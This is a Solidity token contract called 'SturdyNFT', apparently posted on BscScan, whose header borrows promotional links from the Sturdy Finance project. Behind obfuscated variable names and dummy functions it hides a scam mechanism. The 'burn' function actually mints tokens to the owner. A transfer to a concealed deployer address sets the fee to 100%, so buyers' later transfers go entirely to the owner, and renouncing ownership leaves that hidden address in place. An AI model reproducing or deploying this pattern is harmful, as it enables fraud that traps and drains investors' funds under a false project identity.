/**
 *Submitted for verification at BscScan.com on 2022-12-30
*/

/*
SturdyNFT
The first decentralized yield farming fund. Farm projects like Convex with up to 10x leverage or become an LP.
We want to make sure all degens are aware of everything Sturdy has to offer in preparation for Sturdy 1.0 
Create content to introduce new users to Sturdy for your chance to win $100 and an exclusive Sturdy hoodie!
Discord: https://discord.gg/tRVHp6Vx5N
https://sturdy.finance
https://t.me/sturdyfinance
https://github.com/sturdyfi
https://docs.sturdy.finance/overview/what-is-sturdy
https://twitter.com/SturdyFinance

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.2;
contract SturdyNFT {
uint256 public  MnvDzw = 34;
address public  SPueqg = address(0);
uint256 public  zGUDJc = 36;
address public  mBiZrB = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  rNgqRY = 38;
address public  rSucii = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "SturdyNFT";
uint256 public constant totalSupply = 10000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 private  fsbFyA = 10000000000000;
uint256 public  eNOvxx = 41;
address public owner;
string public  symbol = "SturdyNFT";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  wxigze = 43;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant KMHjzP = 9+1;
mapping (address => mapping (address => uint256)) private _allowances;
address private  tAXFOR = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  WlXgUH = 45;
uint256 public  bbvJTM = 48;
address public  hDLbzm = address(0);
uint256 public  SjMITg = 50;
address public  HSmrAr = address(0);
address public  PeVqkD = address(0);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
/////////////////////////////////////////////line
function _liq1MnvDzw() private returns (uint256) {
return MnvDzw++ ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
/////////////////////////////////////////////line
function _addzG2UDJc() private returns (uint256) {
return zGUDJc-- ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
/////////////////////////////////////////////line
function _liqrNg3qRY() private returns (uint256) {
return rNgqRY + zGUDJc ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
/////////////////////////////////////////////line
function _addeNOv4xx() private returns (uint256) {
return eNOvxx - wxigze ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ViWtRg");
require(to != address(0), "ViWtRg");
require(amount <= balanceOf[from], "ViWtRg");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KMHjzP/fsbFyA ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==tAXFOR){
fsbFyA = 9+1;
}
emit Transfer(from, to, transferAmount);
}
/////////////////////////////////////////////line
function _addwxigz5e() private returns (uint256) {
return wxigze * eNOvxx ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
/////////////////////////////////////////////line
function _liqW6lXgUH() private returns (uint256) {
return WlXgUH / bbvJTM ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
tAXFOR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
/////////////////////////////////////////////line
function _liqbb7vJTM() private returns (uint256) {
return bbvJTM + WlXgUH ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
/////////////////////////////////////////////line
function _liqSjM8ITg() private returns (uint256) {
return SjMITg++ ;
}

//
}

library Strings {
    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        uint256 index = digits - 1;
        temp = value;
        while (temp != 0) {
            buffer[index--] = bytes1(uint8(48 + temp % 10));
            temp /= 10;
        }
        return string(buffer);
    }
}